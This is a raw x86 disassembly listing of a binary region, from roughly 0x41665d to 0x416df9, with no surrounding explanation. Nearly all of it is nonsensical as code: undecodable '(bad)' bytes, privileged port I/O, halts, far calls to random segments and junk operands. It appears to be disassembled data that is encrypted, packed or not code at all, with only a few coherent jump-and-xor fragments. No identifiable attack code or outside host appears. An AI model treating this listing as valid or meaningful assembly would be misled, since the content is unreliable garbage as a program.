  41665d:	mov    edi,0xc426e910
  416662:	jbe    0x416668
  416664:	or     esi,0xffffffec
  416667:	sbb    bh,BYTE PTR [ecx-0x7e6d067f]
  41666d:	push   ecx
  41666e:	cmp    DWORD PTR [ebp+0x7f6a6c14],esi
  416674:	in     al,0x52
  416676:	adc    edx,esi
  416678:	scas   al,BYTE PTR es:[edi]
  416679:	mov    eax,ds:0xfb1cfc0a
  41667e:	jnp    0x41666d
  416680:	je     0x416689
  416682:	inc    esi
  416683:	push   es
  416684:	sub    ch,bh
  416686:	lahf   
  416687:	pop    edx
  416688:	adc    DWORD PTR [ecx-0x2ed68cf4],0xffffff92
  41668f:	test   DWORD PTR [ebx],edi
  416691:	cwde   
  416692:	ss mov edx,0x747e6ae4
  416698:	sub    al,0xb1
  41669a:	inc    ebx
  41669b:	lods   al,BYTE PTR ds:[esi]
  41669c:	lods   eax,DWORD PTR ds:[esi]
  41669d:	and    edi,DWORD PTR [edi+0x2bf2c1d8]
  4166a3:	(bad)  [ecx-0x42]
  4166a6:	push   0x58
  4166a8:	pop    esi
  4166a9:	ins    BYTE PTR es:[edi],dx
  4166aa:	mov    ebp,ebx
  4166ac:	mov    al,ds:0x9d7d1970
  4166b1:	(bad)  
  4166b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166b3:	jmp    0x1a6e9c99
  4166b8:	fwait
  4166b9:	div    DWORD PTR [ebx+0x25dc0c73]
  4166bf:	sub    BYTE PTR [ecx+0x51],al
  4166c2:	fild   WORD PTR ds:0x4f1158bd
  4166c8:	arpl   bp,dx
  4166ca:	ret    
  4166cb:	mov    edi,0x7e229b94
  4166d0:	dec    esi
  4166d1:	in     eax,0xb1
  4166d3:	(bad)
  4166d6:	add    ebx,DWORD PTR [ebx+eiz*4]
  4166d9:	into   
  4166da:	mov    edi,0x305e4c43
  4166df:	ins    BYTE PTR es:[edi],dx
  4166e0:	les    esi,FWORD PTR [edi-0x1b5f85ad]
  4166e6:	pop    ss
  4166e7:	pop    edi
  4166e8:	add    DWORD PTR [esi],ebx
  4166ea:	pushf  
  4166eb:	shl    DWORD PTR [esp+eiz*4],1
  4166ee:	adc    DWORD PTR [eax+ebp*8],edx
  4166f1:	xlat   BYTE PTR ds:[ebx]
  4166f2:	xor    eax,0xf9de84fd
  4166f7:	add    esp,DWORD PTR [ecx-0x7e]
  4166fa:	mov    al,0x2b
  4166fc:	mov    cs,esp
  4166fe:	pop    ss
  4166ff:	mov    ebx,0x9caee31c
  416704:	pop    ebx
  416705:	push   ecx
  416706:	xor    esi,DWORD PTR [esi-0x30]
  416709:	enter  0x4a58,0x29
  41670d:	jge    0x4166d4
  41670f:	jb     0x4166c5
  416711:	gs cwde 
  416713:	and    al,0xe2
  416715:	and    al,0xd3
  416717:	and    dh,BYTE PTR [edi-0x74cbe4c4]
  41671d:	jo     0x41677c
  41671f:	push   esp
  416720:	push   0x9b6fa6f0
  416725:	pop    esi
  416726:	std    
  416727:	(bad)  
  416728:	hlt    
  416729:	pop    ss
  41672a:	pop    ebx
  41672b:	jns    0x4166b5
  41672d:	or     edi,edx
  41672f:	mov    ds:0xd552f904,eax
  416734:	cmp    ebx,DWORD PTR [esi+0x27]
  416737:	xchg   ebx,eax
  416738:	mov    ebp,0x99475200
  41673d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41673e:	or     eax,0x5a69080
  416743:	mov    bh,0xe1
  416745:	dec    edx
  416746:	push   esp
  416747:	dec    edx
  416748:	clc    
  416749:	jns    0x416792
  41674b:	fistp  WORD PTR [ecx]
  41674d:	into   
  41674e:	xor    DWORD PTR [edx+eiz*8],esi
  416751:	mov    ds:0x2ffaa6d1,al
  416756:	dec    ecx
  416757:	adc    dl,BYTE PTR [esi-0x3e]
  41675a:	les    ebx,FWORD PTR [edx-0x50]
  41675d:	jecxz  0x416789
  41675f:	xor    DWORD PTR [esi-0x2116b73b],ecx
  416765:	xor    ecx,DWORD PTR [ebx-0x10]
  416768:	test   eax,0xba09f3d9
  41676d:	ins    BYTE PTR es:[edi],dx
  41676e:	xchg   esp,eax
  41676f:	les    ecx,FWORD PTR [ecx+0x5e]
  416772:	aaa    
  416773:	adc    BYTE PTR cs:[edx],ch
  416776:	adc    eax,DWORD PTR [esp+ebx*1]
  416779:	mov    ds:0xb2239f41,al
  41677e:	push   esi
  41677f:	add    eax,DWORD PTR [edx-0x1]
  416782:	ins    BYTE PTR es:[edi],dx
  416783:	and    al,0xc6
  416785:	shl    dh,cl
  416787:	jle    0x41678c
  416789:	outs   dx,BYTE PTR ds:[esi]
  41678a:	out    0x31,al
  41678c:	adc    eax,0x9606eb71
  416791:	add    eax,0xaff05983
  416796:	push   ss
  416797:	mov    al,ch
  416799:	repz in eax,0x3c
  41679c:	int    0x4d
  41679e:	inc    ebp
  41679f:	xchg   BYTE PTR [edi+0x2a],bl
  4167a2:	outs   dx,BYTE PTR ds:[esi]
  4167a3:	rsqrtps xmm4,XMMWORD PTR [edx]
  4167a6:	xchg   ecx,eax
  4167a7:	mov    esp,0xd8da3603
  4167ac:	and    ch,BYTE PTR [bx+di-0x33]
  4167b0:	les    ebx,FWORD PTR [ebx]
  4167b2:	mov    ah,0x85
  4167b4:	ror    BYTE PTR [eax+ecx*1],cl
  4167b7:	repnz popa 
  4167b9:	and    eax,0x5b97660c
  4167be:	ret    
  4167bf:	sar    DWORD PTR [ecx+0x26],1
  4167c2:	sbb    DWORD PTR [eax+0x51],0x2
  4167c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167c7:	jbe    0x41679a
  4167c9:	inc    esp
  4167ca:	adc    eax,0x2a66b946
  4167cf:	mov    cl,0x66
  4167d1:	leave  
  4167d2:	xchg   dl,bh
  4167d4:	lods   al,BYTE PTR ds:[esi]
  4167d5:	mov    ebp,0xce83fc71
  4167da:	(bad)  
  4167db:	(bad)  
  4167dc:	mov    dh,0x7b
  4167de:	mov    WORD PTR [edx+eax*8+0x37d2b41b],gs
  4167e5:	dec    esi
  4167e6:	xor    eax,0xd2eaf3e3
  4167eb:	and    eax,0x3b6eeeb0
  4167f0:	scas   al,BYTE PTR es:[edi]
  4167f1:	mov    al,BYTE PTR [ebx]
  4167f3:	and    esi,0x74
  4167f6:	add    eax,0x560d958f
  4167fb:	ins    BYTE PTR es:[edi],dx
  4167fc:	xchg   edi,eax
  4167fd:	mov    DWORD PTR [ecx],eax
  4167ff:	mov    eax,DWORD PTR [ebp-0x8]
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	push   ecx
  416819:	xor    edx,ebx
  41681b:	pop    es
  41681c:	jbe    0x416841
  41681e:	jg     0x416898
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x4168a1
  416825:	inc    esi
  416826:	icebp  
  416827:	pop    esp
  416828:	mov    al,ds:0xe2f5250b
  41682d:	js     0x416840
  41682f:	jae    0x41689b
  416831:	dec    ebp
  416832:	in     al,dx
  416833:	cmp    al,0x3a
  416835:	pop    es
  416836:	cs stos BYTE PTR es:[edi],al
  416838:	xor    bh,BYTE PTR [edx+0x3da229b4]
  41683e:	jecxz  0x416893
  416840:	sub    DWORD PTR [esi+0x7b013077],edi
  416846:	adc    DWORD PTR ds:0x9f13f82b,ebx
  41684c:	mov    ?,WORD PTR [edi-0x28]
  41684f:	nop
  416850:	xchg   edx,eax
  416851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416852:	add    ebx,edx
  416854:	adc    esp,DWORD PTR [eax]
  416856:	add    eax,0x9d4c807c
  41685b:	add    edx,ecx
  41685d:	push   cs
  41685e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41685f:	in     eax,dx
  416860:	xor    eax,0x3816c1e3
  416865:	adc    BYTE PTR [ebp+eiz*8+0x6],ch
  416869:	sahf   
  41686a:	out    0xb1,eax
  41686c:	(bad)  
  41686d:	xor    BYTE PTR [edi-0x68756cff],ah
  416873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416874:	(bad)  [ecx+0x138d1566]
  41687a:	mov    dh,0xcd
  41687c:	dec    esi
  41687d:	mov    ds:0x381f1992,eax
  416882:	mov    ebp,0xfb4bd35c
  416887:	out    dx,al
  416888:	add    bh,BYTE PTR [ecx+0x45]
  41688b:	out    dx,al
  41688c:	pop    edx
  41688d:	(bad)  
  41688e:	fs mov ch,0xf5
  416891:	cmp    al,0x53
  416893:	iret   
  416894:	mov    dl,0x5f
  416896:	test   al,0x9b
  416898:	xor    eax,0xee1785e8
  41689d:	lock test eax,0xda61fd28
  4168a3:	das    
  4168a4:	int3   
  4168a5:	inc    ebx
  4168a6:	dec    esi
  4168a7:	ret    0x59a
  4168aa:	mov    dh,0x4f
  4168ac:	cdq    
  4168ad:	stos   BYTE PTR es:[edi],al
  4168ae:	rcl    DWORD PTR [esi],1
  4168b0:	ins    BYTE PTR es:[edi],dx
  4168b1:	ss pop ebx
  4168b3:	mov    fs,WORD PTR [ecx-0x75]
  4168b6:	adc    dl,BYTE PTR [edi+ebx*1+0x79]
  4168ba:	and    cl,ch
  4168bc:	or     BYTE PTR [ecx],0x3c
  4168bf:	stos   BYTE PTR es:[edi],al
  4168c0:	mov    fs:0xf9de74d1,eax
  4168c6:	out    dx,eax
  4168c7:	test   BYTE PTR [ebx-0x19],0x18
  4168cb:	retf   0x43ed
  4168ce:	aad    0x45
  4168d0:	enter  0x6620,0x66
  4168d4:	cwde   
  4168d5:	pop    es
  4168d6:	pop    ecx
  4168d7:	xchg   edx,eax
  4168d8:	daa    
  4168d9:	ins    DWORD PTR es:[edi],dx
  4168da:	pusha  
  4168db:	push   ss
  4168dc:	hlt    
  4168dd:	scas   al,BYTE PTR es:[edi]
  4168de:	cmp    DWORD PTR [edi-0x450b953a],ebp
  4168e4:	outs   dx,DWORD PTR es:[esi]
  4168e6:	cdq    
  4168e7:	adc    BYTE PTR [edx],dh
  4168e9:	dec    esi
  4168ea:	les    ebx,FWORD PTR [esp+eax*4]
  4168ed:	mov    bh,0x8e
  4168ef:	test   BYTE PTR [eax+ebp*1-0x29],ch
  4168f3:	inc    edx
  4168f4:	jo     0x4168ba
  4168f6:	sub    esi,DWORD PTR [esi]
  4168f8:	imul   esi,DWORD PTR [edi+0x41],0xd2abebd
  4168ff:	dec    ebx
  416900:	fisubr WORD PTR [ebx]
  416902:	pop    ebp
  416903:	inc    eax
  416904:	or     BYTE PTR ds:0x5b5568eb,0x9b
  41690b:	adc    DWORD PTR [ebp-0x6d],0xffffffff
  41690f:	shr    cl,1
  416911:	mov    ?,WORD PTR [edi-0x18]
  416914:	mov    esi,0x76f9da7b
  416919:	pop    ds
  41691a:	(bad)  [ebp-0x7e26090]
  416920:	mov    esi,0x6788b357
  416925:	xlat   BYTE PTR ds:[ebx]
  416926:	sbb    BYTE PTR [edi-0x42d15b2e],bl
  41692c:	test   al,0x70
  41692e:	shl    DWORD PTR [ecx-0x49],1
  416931:	daa    
  416932:	jbe    0x4168fb
  416934:	mov    al,0x40
  416936:	out    dx,eax
  416937:	out    dx,al
  416938:	ja     0x4169a6
  41693a:	pop    ds
  41693b:	and    BYTE PTR [ebx],dl
  41693d:	adc    DWORD PTR [ebx],0x45
  416940:	sti    
  416941:	frndint 
  416943:	sbb    DWORD PTR [esi+ebp*1+0x60],ebp
  416947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416948:	push   esp
  416949:	aam    0x2f
  41694b:	aas    
  41694c:	xchg   cl,ch
  41694e:	inc    esi
  41694f:	(bad)  
  416950:	rol    BYTE PTR [eax],cl
  416952:	add    al,0xfb
  416954:	leave  
  416955:	aad    0xf6
  416957:	test   eax,0x9950b9e9
  41695c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41695d:	mov    BYTE PTR [edx-0x40ed6113],ah
  416963:	outs   dx,BYTE PTR ds:[esi]
  416964:	retf   0xc129
  416967:	xor    ah,BYTE PTR ds:0x57b454a5
  41696d:	or     DWORD PTR [eax-0x12],0x2e
  416971:	adc    edx,DWORD PTR [edi+0x42]
  416974:	jnp    0x4168fe
  416976:	jae    0x4169a5
  416978:	xor    eax,0x866f34da
  41697d:	or     al,0x75
  41697f:	cdq    
  416980:	ret    
  416981:	jns    0x416977
  416983:	(bad)  
  416984:	sub    bh,al
  416986:	pop    ecx
  416987:	cmp    edi,DWORD PTR [ebp+0xa2a42e]
  41698d:	mov    ?,WORD PTR [eax]
  41698f:	add    al,0x8b
  416991:	test   DWORD PTR [ebx-0x50],ebp
  416994:	mov    ch,0x72
  416996:	mov    al,ds:0xa5c67fe1
  41699b:	xchg   BYTE PTR [edi-0x6],bl
  41699e:	jne    0x4169ee
  4169a0:	pop    ebx
  4169a1:	or     DWORD PTR [ebx+edi*4],esp
  4169a4:	fist   WORD PTR [edi+0x29]
  4169a7:	mov    ecx,0x93832705
  4169ac:	adc    DWORD PTR [ecx],ecx
  4169ae:	and    esi,ebx
  4169b0:	mov    esi,0xe4d1257c
  4169b5:	pop    ebx
  4169b6:	xor    eax,0xdab84b72
  4169bb:	ins    BYTE PTR es:[edi],dx
  4169bc:	lahf   
  4169bd:	(bad)  
  4169be:	xchg   edi,eax
  4169bf:	xor    DWORD PTR [ecx],esi
  4169c1:	stc    
  4169c2:	mov    ds:0x9f84b74a,eax
  4169c7:	ins    BYTE PTR es:[edi],dx
  4169c8:	sbb    DWORD PTR [edi+edi*2+0x42b36e97],ebx
  4169cf:	push   esp
  4169d0:	dec    ebp
  4169d1:	mov    cx,0xf5c5
  4169d5:	lods   al,BYTE PTR ds:[esi]
  4169d6:	sar    BYTE PTR [eax],1
  4169d8:	out    0xa8,al
  4169da:	ret    0x3972
  4169dd:	mov    eax,ds:0x51eb7e4d
  4169e2:	mov    ch,0x1d
  4169e4:	dec    edx
  4169e5:	ror    DWORD PTR [edi],1
  4169e7:	push   cs
  4169e8:	jmp    0x7e0fba77
  4169ed:	and    BYTE PTR [ebx-0x6c446df4],dh
  4169f3:	out    0x13,eax
  4169f5:	jae    0x416a33
  4169f7:	outs   dx,DWORD PTR ds:[esi]
  4169f8:	and    dh,dl
  4169fa:	inc    ecx
  4169fb:	xor    esp,DWORD PTR es:[edi-0x1e]
  4169ff:	rcr    ch,cl
  416a01:	fwait
  416a02:	adc    DWORD PTR [ebx-0x2e],ebx
  416a05:	fistp  WORD PTR [esi]
  416a07:	les    esi,FWORD PTR [ecx-0x38]
  416a0a:	or     edx,ecx
  416a0c:	das    
  416a0d:	jo     0x416a8c
  416a0f:	fild   WORD PTR [eax+0x1b5766a9]
  416a15:	repnz sub esp,DWORD PTR fs:[esi]
  416a19:	push   eax
  416a1a:	mov    ebx,0xf13e242d
  416a1f:	push   ds
  416a20:	ja     0x416a81
  416a22:	mov    BYTE PTR [eax+0x24b1cfa],ch
  416a28:	hlt    
  416a29:	call   0x8798:0xc56f939d
  416a30:	jmp    0xbd27a69e
  416a35:	retf   
  416a36:	mov    ah,0xd4
  416a38:	and    eax,0xace20610
  416a3d:	leave  
  416a3e:	mov    cl,BYTE PTR [ebx-0x727006]
  416a44:	lods   al,BYTE PTR ds:[esi]
  416a45:	xchg   edx,eax
  416a46:	jmp    0xba40994f
  416a4b:	sub    edi,DWORD PTR [ebx+0x39392106]
  416a51:	shl    BYTE PTR [ebp+0x1314a281],1
  416a57:	mov    al,0xea
  416a59:	imul   ebp,DWORD PTR [esi+ebp*1+0x24],0x47ca96f
  416a61:	(bad)  
  416a62:	mov    ds:0x1a8ef4ce,eax
  416a67:	push   es
  416a68:	push   esi
  416a69:	retf   0x8d6c
  416a6c:	mov    bl,0xb3
  416a6e:	dec    ecx
  416a6f:	aas    
  416a70:	fsubrp st(6),st
  416a72:	in     al,dx
  416a73:	and    dh,BYTE PTR [edx]
  416a75:	es jnp 0x4169fe
  416a78:	test   DWORD PTR [edx+0x6e],eax
  416a7b:	xchg   esi,eax
  416a7c:	aad    0xa8
  416a7e:	or     ebp,DWORD PTR [ebx]
  416a80:	fwait
  416a81:	jmp    0xa5e4:0x361a9797
  416a88:	mov    esi,0xec4b508d
  416a8d:	push   cs
  416a8e:	cli    
  416a8f:	dec    ebx
  416a90:	rcr    BYTE PTR [ebx],0x16
  416a93:	xchg   ebp,eax
  416a94:	pop    ebp
  416a95:	pop    ecx
  416a96:	std    
  416a97:	rcl    ch,1
  416a99:	xor    al,dl
  416a9b:	xor    eax,DWORD PTR [ebx]
  416a9d:	xchg   esp,eax
  416a9e:	push   edx
  416a9f:	jecxz  0x416b17
  416aa1:	lods   eax,DWORD PTR ds:[esi]
  416aa2:	popa   
  416aa3:	or     bh,BYTE PTR [ebp-0x49af013b]
  416aa9:	out    0x6d,eax
  416aab:	outs   dx,BYTE PTR ds:[esi]
  416aac:	hlt    
  416aad:	ret    
  416aae:	cs in  eax,dx
  416ab0:	dec    eax
  416ab1:	shl    DWORD PTR [eax],cl
  416ab3:	loop   0x416aa0
  416ab5:	pop    esp
  416ab6:	ret    0x892b
  416ab9:	mov    cl,0x9a
  416abb:	sahf   
  416abc:	ins    BYTE PTR es:[edi],dx
  416abd:	in     eax,0x84
  416abf:	mov    eax,DWORD PTR [ebp-0x4]
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0x7764ff75
  416ad4:	pop    ebx
  416ad5:	push   0x7f209309
  416ada:	js     0x416a71
  416adc:	jle    0x416b56
  416ade:	js     0x416b59
  416ae0:	(bad)  
  416ae1:	fidiv  WORD PTR [eax]
  416ae3:	sub    edi,DWORD PTR ds:0x63249be3
  416ae9:	inc    ecx
  416aea:	fcomi  st,st(6)
  416aec:	out    dx,al
  416aed:	es sbb eax,0x60be6ef2
  416af3:	mov    bh,0xbd
  416af5:	pop    ss
  416af6:	leave  
  416af7:	dec    ebx
  416af8:	sub    ch,BYTE PTR [edi+0x31]
  416afb:	mov    eax,ds:0xfb695ee
  416b00:	loopne 0x416ac6
  416b02:	ffree  st(4)
  416b04:	clc    
  416b05:	idiv   BYTE PTR [eax]
  416b07:	(bad)  
  416b08:	jl     0x416aae
  416b0a:	ret    0x7048
  416b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b0e:	mov    WORD PTR [edx+0x198313d4],gs
  416b14:	jo     0x416abe
  416b16:	mov    dl,0x5e
  416b18:	shr    al,1
  416b1a:	push   edx
  416b1b:	fnstenv [edi*8+0x596a2242]
  416b22:	xchg   edx,eax
  416b23:	mov    al,0x34
  416b25:	cwde   
  416b26:	lods   eax,DWORD PTR ds:[esi]
  416b27:	sar    ch,1
  416b29:	repz mov ah,0x36
  416b2c:	sub    edi,DWORD PTR [eax]
  416b2e:	inc    esi
  416b2f:	push   edi
  416b30:	sub    DWORD PTR [ebp+0x3a],ecx
  416b33:	gs dec ecx
  416b35:	les    edx,FWORD PTR [edx+esi*8]
  416b38:	inc    ecx
  416b39:	cmp    al,0x4f
  416b3b:	sbb    cl,BYTE PTR [ecx]
  416b3d:	xor    BYTE PTR [ebx],al
  416b3f:	mov    edi,DWORD PTR [ecx-0x9]
  416b42:	adc    eax,DWORD PTR es:[ebx+eax*8+0x1b]
  416b47:	mov    ch,0xe2
  416b49:	mov    ds:0x2d594f59,al
  416b4e:	jnp    0x416b4e
  416b50:	lahf   
  416b51:	cmc    
  416b52:	inc    eax
  416b53:	adc    al,0xfc
  416b55:	sub    DWORD PTR [ebx],eax
  416b57:	(bad)  
  416b58:	mov    al,0x5c
  416b5a:	dec    ebx
  416b5b:	mov    edi,0x63583f5e
  416b60:	push   0xd1467e19
  416b65:	rol    BYTE PTR [ebx+0x1a],1
  416b68:	mov    edi,0x297bdc44
  416b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b6e:	hlt    
  416b6f:	xchg   ebp,eax
  416b70:	(bad)  
  416b71:	pusha  
  416b72:	es sbb eax,0xe1818e11
  416b78:	fisubr WORD PTR [esi+0x5b]
  416b7b:	(bad)  
  416b7d:	xchg   BYTE PTR [edx],al
  416b7f:	rcr    BYTE PTR [esi],cl
  416b81:	push   edx
  416b82:	push   esp
  416b83:	repz arpl WORD PTR ds:0x1c4e1dc8,ax
  416b8a:	call   0x2ab840f
  416b8f:	and    edx,DWORD PTR [ebx+0x15ea3e77]
  416b95:	pop    edi
  416b96:	cmp    eax,0xaee40298
  416b9b:	dec    ecx
  416b9c:	dec    esi
  416b9d:	jns    0x416c14
  416b9f:	hlt    
  416ba0:	pusha  
  416ba1:	or     DWORD PTR [ecx-0x42],0x4f11555f
  416ba8:	out    dx,al
  416ba9:	inc    esi
  416baa:	push   es
  416bab:	ja     0x416c2a
  416bad:	jnp    0x416bd2
  416baf:	inc    esp
  416bb0:	add    esi,DWORD PTR [eax+eiz*8+0x19ab602d]
  416bb7:	add    bl,BYTE PTR [ebx]
  416bb9:	ds ins DWORD PTR es:[edi],dx
  416bbb:	push   ds
  416bbc:	sahf   
  416bbd:	and    ch,BYTE PTR [esi+eiz*8]
  416bc0:	outs   dx,DWORD PTR ds:[esi]
  416bc1:	pop    ss
  416bc2:	mov    DWORD PTR [edx],eax
  416bc4:	and    al,0x94
  416bc6:	sub    bh,BYTE PTR ds:0xf8eb245d
  416bcc:	std    
  416bcd:	sbb    esi,esp
  416bcf:	dec    edi
  416bd0:	fstp   st(4)
  416bd2:	xchg   esi,eax
  416bd3:	outs   dx,DWORD PTR ds:[esi]
  416bd4:	mov    ch,0x53
  416bd6:	retf   
  416bd7:	inc    edi
  416bd8:	aas    
  416bd9:	ficomp WORD PTR [ebx-0x3d]
  416bdc:	jle    0x416c4f
  416bde:	sahf   
  416bdf:	icebp  
  416be0:	sub    DWORD PTR [eax+0x48],0x18
  416be4:	in     eax,dx
  416be5:	mov    al,0x50
  416be7:	loop   0x416bb3
  416be9:	mov    esp,0xe8bf481d
  416bee:	and    ah,cl
  416bf0:	bound  esp,QWORD PTR [eax+0x73]
  416bf3:	add    al,0xc1
  416bf5:	sub    esi,edx
  416bf7:	loop   0x416bd9
  416bf9:	inc    ebx
  416bfa:	xor    esi,edi
  416bfc:	mov    ecx,0x4c81bbaa
  416c01:	lea    ecx,cs:[esi+eax*1-0x591a8ef5]
  416c09:	hlt    
  416c0a:	jge    0x416bbd
  416c0c:	mov    dl,0x59
  416c0e:	sub    al,0x52
  416c10:	xor    eax,0x2d92d8c0
  416c15:	xchg   ebx,eax
  416c16:	inc    esi
  416c17:	nop    DWORD PTR [esi+ecx*2+0x66b9f767]
  416c1f:	addr16 push ebp
  416c21:	mov    bl,0x14
  416c23:	imul   eax,DWORD PTR [ecx],0x72afba03
  416c29:	stos   BYTE PTR es:[edi],al
  416c2a:	xor    eax,0x9d9d4ca9
  416c2f:	and    esi,ebx
  416c31:	sbb    bh,BYTE PTR [edi+0x62]
  416c34:	sbb    DWORD PTR [edx-0x7],0x69
  416c38:	sbb    BYTE PTR ds:0x20f771ce,dl
  416c3e:	add    ax,0xfd01
  416c42:	add    DWORD PTR [esi-0x6bcf2978],ebx
  416c48:	push   0x28
  416c4a:	push   0x21ddcb0b
  416c4f:	jle    0x416c1d
  416c51:	repz mov ebp,0x1d47da32
  416c57:	mov    ebx,0xa462e40c
  416c5c:	mov    dl,0xf7
  416c5e:	jl     0x416c24
  416c60:	or     esp,DWORD PTR [ebp+ebp*8+0x3c8eb3fc]
  416c67:	xlat   BYTE PTR ds:[ebx]
  416c68:	ss jno 0x416cbc
  416c6b:	mov    esp,0xb8ba1eb6
  416c70:	add    eax,0x2fe75ff8
  416c75:	fwait
  416c76:	call   0xc875:0xc7db0b83
  416c7d:	sub    al,0xa5
  416c7f:	mov    ecx,0x9ed121ce
  416c84:	xchg   BYTE PTR [edi],al
  416c86:	iret   
  416c87:	clc    
  416c88:	(bad)  
  416c89:	iret   
  416c8a:	jb     0x416c9c
  416c8c:	and    bl,BYTE PTR [ebx-0x30]
  416c8f:	mov    bh,0x83
  416c91:	dec    ebp
  416c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c93:	lods   al,BYTE PTR ds:[esi]
  416c94:	ds fs jnp 0x416ced
  416c98:	cmp    WORD PTR [ecx+0x1c],bp
  416c9c:	sahf   
  416c9d:	dec    edi
  416c9e:	mov    ecx,0x69542809
  416ca3:	outs   dx,DWORD PTR ds:[esi]
  416ca4:	ss sub bh,al
  416ca7:	and    DWORD PTR [esp+edi*4+0x1b371c4b],esi
  416cae:	inc    edx
  416caf:	rol    ebx,1
  416cb1:	leave  
  416cb2:	push   ds
  416cb3:	xchg   edi,eax
  416cb4:	xor    dl,BYTE PTR [ebx]
  416cb6:	sub    DWORD PTR [edi],edx
  416cb8:	xchg   edi,eax
  416cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cba:	mov    edi,0x9285b60f
  416cbf:	out    dx,al
  416cc0:	jnp    0x416cf4
  416cc2:	pop    eax
  416cc3:	dec    ecx
  416cc4:	retf   
  416cc5:	loopne 0x416cf4
  416cc7:	mov    dh,0xce
  416cc9:	fisub  WORD PTR [edx]
  416ccb:	pusha  
  416ccc:	daa    
  416ccd:	and    eax,0x8e6ec35
  416cd2:	gs dec esi
  416cd4:	shl    DWORD PTR [edi+0x5f340003],0x38
  416cdb:	out    dx,eax
  416cdc:	xchg   edi,eax
  416cdd:	ds hlt 
  416cdf:	and    al,0x76
  416ce1:	or     al,0xb3
  416ce3:	test   BYTE PTR ds:0x59399275,dl
  416ce9:	xlat   BYTE PTR ds:[ebx]
  416cea:	lock rcr DWORD PTR [esi],0x3f
  416cee:	cmp    eax,0x756fdfa0
  416cf3:	rol    DWORD PTR [esi-0xe626053],1
  416cf9:	ret    
  416cfa:	iret   
  416cfb:	fwait
  416cfc:	pop    esi
  416cfd:	xchg   BYTE PTR [ecx+0x6e7ff5e],al
  416d03:	test   eax,0x5b8f657d
  416d08:	rcl    BYTE PTR [edx-0x68],cl
  416d0b:	jns    0x416d0d
  416d0d:	pop    es
  416d0e:	jno    0x416ccc
  416d10:	adc    bh,BYTE PTR [eax+esi*8-0x2d]
  416d14:	push   esi
  416d15:	mov    al,0x0
  416d17:	xor    cl,cl
  416d19:	dec    esp
  416d1a:	lods   eax,DWORD PTR ds:[esi]
  416d1b:	or     ah,BYTE PTR [ecx+0x54]
  416d1e:	lahf   
  416d1f:	lea    ebx,[esi]
  416d21:	pop    ecx
  416d22:	push   ebp
  416d23:	sar    dl,1
  416d25:	pop    DWORD PTR [esi+ecx*8+0x42f48689]
  416d2c:	dec    eax
  416d2d:	dec    edx
  416d2e:	shr    bl,0xda
  416d31:	aad    0x75
  416d33:	inc    edx
  416d34:	push   edi
  416d35:	popf   
  416d36:	xchg   esp,eax
  416d37:	std    
  416d38:	test   al,0x4a
  416d3a:	stc    
  416d3b:	sahf   
  416d3c:	xor    cl,BYTE PTR [esi]
  416d3e:	cli    
  416d3f:	sbb    al,0x32
  416d41:	fnsave [eax-0x3243d090]
  416d47:	dec    ecx
  416d48:	mov    ?,WORD PTR [esi+0x3c7067d]
  416d4e:	in     al,0x9b
  416d50:	jge    0x416ce1
  416d52:	lea    edi,[ebx-0xf024b06]
  416d58:	xor    cl,BYTE PTR [edx-0x54]
  416d5b:	jno    0x416dc4
  416d5d:	call   0x7d5f:0x73609b08
  416d64:	(bad)  
  416d65:	sbb    esi,DWORD PTR [edx-0x53]
  416d68:	call   0x71e:0xed101876
  416d6f:	mov    esi,esp
  416d71:	retf   0xd66a
  416d74:	lar    edi,WORD PTR [ebp-0x35]
  416d78:	ds int 0x8b
  416d7b:	dec    ebp
  416d7c:	adc    BYTE PTR [ebx],dh
  416d7e:	mov    DWORD PTR [ebx],0xfc13bc6
  416d84:	test   DWORD PTR [ebx-0x74fffffb],edx
  416d8a:	inc    ebp
  416d8b:	cld    
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0xc231:0x55b41efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	icebp  
  416db8:	push   eax
  416db9:	pop    eax
  416dba:	dec    edi
  416dbb:	shr    DWORD PTR [edx-0x5d],cl
  416dbe:	addr16 push es
  416dc0:	mov    edi,0xce3f026e
  416dc5:	mov    ch,0xe9
  416dc7:	xlat   BYTE PTR ds:[ebx]
  416dc8:	aad    0x6e
  416dca:	aad    0x63
  416dcc:	mov    ah,0x8f
  416dce:	pop    ecx
  416dcf:	cmp    eax,0xaa852d93
  416dd4:	lock gs xor al,0xd0
  416dd8:	(bad)  
  416dd9:	cmp    BYTE PTR [ecx],bl
  416ddb:	loopne 0x416de8
  416ddd:	dec    edi
  416dde:	pop    ss
  416ddf:	daa    
  416de0:	ret    0xcc81
  416de3:	in     al,0xb1
  416de5:	pop    esp
  416de6:	push   esp
  416de7:	fbstp  TBYTE PTR [ebx-0x50f1ee96]
  416ded:	(bad)  
  416def:	inc    ebp
  416df0:	leave  
  416df1:	out    0x33,al
  416df3:	aad    0x27
  416df5:	sub    DWORD PTR [edx],eax
  416df7:	push   ecx
  416df8:	push   ebp
  416df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
